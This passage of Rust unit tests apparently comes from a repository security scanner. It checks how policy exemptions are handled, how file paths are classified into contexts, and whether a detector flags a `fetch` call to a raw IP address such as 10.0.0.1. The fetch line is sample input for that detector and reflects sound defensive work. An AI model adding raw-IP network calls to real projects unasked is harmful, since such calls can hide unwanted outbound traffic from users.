        assert!(got.iter().all(|s| s.note.contains("exempted")));
        let strict = scan_dir(d.path(), Kind::Repo, &Policy::default());
        assert!(strict.iter().all(|s| s.hard), "{strict:?}");
    }

    #[test]
    fn contexts() {
        assert_eq!(context("a/b/package.json"), Context::Manifest);
        assert_eq!(context("x.tsx"), Context::Web);
        assert_eq!(context("k.metal"), Context::Native);
        assert_eq!(context("s.scss"), Context::Style);
        assert_eq!(context("README.md"), Context::Other);
        assert_eq!(raw_ip_url("fetch('http://10.0.0.1/x')"), Some(("10.0.0.1".into(), 1)));
        assert_eq!(raw_ip_url("fetch('http://127.0.0.1/x')"), None);
        assert_eq!(raw_ip_url("http://example.com"), None);
    }
}
